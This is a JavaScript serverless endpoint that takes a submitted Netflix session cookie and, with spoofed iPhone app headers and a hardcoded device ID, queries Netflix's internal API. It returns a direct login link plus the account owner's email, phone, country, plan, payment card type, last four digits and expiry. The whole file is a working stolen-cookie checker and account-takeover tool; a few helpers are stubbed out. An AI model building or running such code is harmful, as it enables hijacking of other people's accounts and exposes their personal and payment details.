// api/generate.js
const COUNTRY_MAP = { /* ... poora map rakho ... */ };

function getCountryDisplay(code) { return COUNTRY_MAP[code] ? `${COUNTRY_MAP[code]} (${code})` : code; }
function extractCookies(text) { /* same as before */ }
function parsePayment(account) { /* same as before */ }

async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  const { cookie: raw_cookie, device = 'mobile' } = req.body || {};
  const trimmedCookie = (raw_cookie || '').trim();

  if (!trimmedCookie) {
    return res.status(400).json({ error: 'No cookie data provided.', cookie: '' });
  }

  try {
    const cookie_dict = extractCookies(trimmedCookie);
    if (!cookie_dict.NetflixId) {
      return res.status(400).json({
        error: 'Missing required cookie: NetflixId.',
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    const api_url = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';

    // ------- STEP 1: Get Token (original path + headers) -------
    const tokenQuery = new URLSearchParams({
      appVersion: '15.48.1',
      config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
      device_type: 'NFAPPL-02-',
      esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      idiom: 'phone',
      iosVersion: '15.8.5',
      isTablet: 'false',
      languages: 'en-US',
      locale: 'en-US',
      maxDeviceWidth: '375',
      model: 'saget',
      modelType: 'IPHONE8-1',
      odpAware: 'true',
      path: '["account","token","default"]',   // original token path
      pathFormat: 'graph',
      pixelDensity: '2.0',
      progressive: 'false',
      responseFormat: 'json'
    });

    // headers for token request (original)
    const tokenHeaders = (device === 'desktop') ? {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...',
      'x-netflix.request.client.user.guid': cookie_dict.NetflixId,
      'x-netflix.context.profile-guid': cookie_dict.NetflixId,
      // ... (poora desktop headers set)
      'Cookie': `NetflixId=${cookie_dict.NetflixId}`,
    } : {
      'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
      'x-netflix.request.client.user.guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',   // hardcoded for token
      'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
      // ... (poora mobile headers set)
      'Cookie': `NetflixId=${cookie_dict.NetflixId}`,
    };

    const tokenRes = await fetch(`${api_url}?${tokenQuery.toString()}`, {
      method: 'GET',
      headers: tokenHeaders,
    });

    if ([401, 403, 400].includes(tokenRes.status)) {
      return res.json({ expired: true, error: 'Cookies expired or invalid.', cookie: trimmedCookie.substring(0, 100) });
    }
    if (!tokenRes.ok) {
      return res.status(tokenRes.status).json({ error: `Netflix API returned HTTP ${tokenRes.status}`, cookie: trimmedCookie.substring(0, 100) });
    }

    const tokenData = await tokenRes.json();
    const tokenDefault = tokenData?.value?.account?.token?.default || {};
    const token = tokenDefault.token;
    let expires = tokenDefault.expires;

    if (!token) {
      return res.json({ expired: true, error: 'Token not found. Cookie expired.', cookie: trimmedCookie.substring(0, 100) });
    }

    if (typeof expires === 'number' && expires.toString().length === 13) {
      expires = Math.floor(expires / 1000);
    }
    const login_url = `https://netflix.com/?nftoken=${encodeURIComponent(token)}`;

    // ------- STEP 2: Get User/Account Details with corrected GUIDs -------
    let accountDetails = null;
    try {
      const userQuery = new URLSearchParams({
        appVersion: '15.48.1',
        config: '{"gamesInTrailersEnabled":"false",...}',
        device_type: 'NFAPPL-02-',
        esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        idiom: 'phone',
        iosVersion: '15.8.5',
        isTablet: 'false',
        languages: 'en-US',
        locale: 'en-US',
        maxDeviceWidth: '375',
        model: 'saget',
        modelType: 'IPHONE8-1',
        odpAware: 'true',
        path: '["user"]',   // only user (includes account data)
        pathFormat: 'graph',
        pixelDensity: '2.0',
        progressive: 'false',
        responseFormat: 'json'
      });

      // Create headers for user data request – **use actual NetflixId for GUIDs**
      const userHeaders = {
        ...tokenHeaders,   // copy all common headers (cookie, etc.)
        // Override GUIDs with actual NetflixId value
        'x-netflix.request.client.user.guid': cookie_dict.NetflixId,
        'x-netflix.context.profile-guid': cookie_dict.NetflixId,
        'x-netflix.request.toplevel.uuid': cookie_dict.NetflixId,   // optional but safe
      };

      const userRes = await fetch(`${api_url}?${userQuery.toString()}`, {
        method: 'GET',
        headers: userHeaders,
      });

      if (userRes.ok) {
        const userData = await userRes.json();
        const user = userData?.value?.user || {};
        const account = userData?.value?.account || {};

        const email = user.email || 'N/A';
        const countryCode = user.countryOfSignup || 'N/A';
        const country_display = getCountryDisplay(countryCode);
        const planName = user.membershipPlan?.plan || 'N/A';
        const planDisplay = planName.charAt(0) + planName.slice(1).toLowerCase();
        const price = user.membershipPlan?.recurringCharge;
        const currency = user.membershipPlan?.currency;
        const price_display = price && currency ? `${currency} ${price}` : 'N/A';
        const memberSince = account.planInfo?.memberSince || user.membershipStartDate || 'N/A';
        const renewalDate = account.planInfo?.renewalDate || 'N/A';
        const payment = parsePayment(account);
        const phone = account.phone || user.phone || 'N/A';
        const profilesArray = user.profiles || [];
        const profileNames = profilesArray.map(p => p.profileName || p.name).filter(Boolean).join(', ') || 'N/A';
        const profilesCount = profilesArray.length || 'N/A';
        const membershipStatus = user.membershipStatus || 'CURRENT_MEMBER';
        const statusText = membershipStatus === 'CURRENT_MEMBER' ? 'Active' : 'Inactive';

        accountDetails = {
          email, phone, country: country_display,
          membershipStatus: statusText, memberSince,
          plan: { name: planDisplay, price: price || undefined, currency: currency || undefined },
          payment,
          profiles: { count: profilesCount, names: profileNames }
        };
      }
    } catch (detailsError) {
      console.error('Account details fetch failed (non-critical):', detailsError);
    }

    // Build final response
    const baseResponse = {
      status: "SUCCESS",
      url: login_url,
      expires_ts: Number(expires),
      expires: new Date(Number(expires) * 1000).toISOString().replace('T', ' ').split('.')[0],
      account: accountDetails,
      email: accountDetails?.email || 'N/A',
      country: accountDetails?.country ? accountDetails.country.match(/\(([^)]+)\)/)?.[1] || 'N/A' : 'N/A',
      country_display: accountDetails?.country || 'N/A',
      plan: accountDetails?.plan?.name || 'N/A',
      price: accountDetails?.plan?.price && accountDetails.plan.currency ? `${accountDetails.plan.currency} ${accountDetails.plan.price}` : 'N/A',
      renewal_date: accountDetails?.memberSince || 'N/A',
      member_since: accountDetails?.memberSince || 'N/A',
      payment: accountDetails?.payment?.type ? `${accountDetails.payment.type}${accountDetails.payment.lastFourDigits !== 'N/A' ? ' •••• '+accountDetails.payment.lastFourDigits : ''}${accountDetails.payment.expiry !== 'N/A' ? ' (Exp: '+accountDetails.payment.expiry+')' : ''}` : 'N/A',
      phone: accountDetails?.phone || 'N/A',
      profiles_count: accountDetails?.profiles?.count || 'N/A',
      profile_names: accountDetails?.profiles?.names || 'N/A',
      x_mail: accountDetails?.email || 'N/A',
      x_tier: accountDetails?.plan?.name || 'N/A',
      x_loc: accountDetails?.country ? accountDetails.country.match(/\(([^)]+)\)/)?.[1] || 'N/A' : 'N/A',
      x_ren: accountDetails?.memberSince || 'N/A',
      x_mem: accountDetails?.memberSince || 'N/A',
      x_bil: accountDetails?.payment?.type || 'N/A',
      x_tel: accountDetails?.phone || 'N/A',
      x_usr: accountDetails?.profiles?.names || 'N/A',
    };

    return res.json(baseResponse);

  } catch (error) {
    console.error('Function error:', error);
    return res.status(500).json({ error: 'Internal server error.', cookie: trimmedCookie.substring(0, 100) });
  }
}

module.exports = handler;
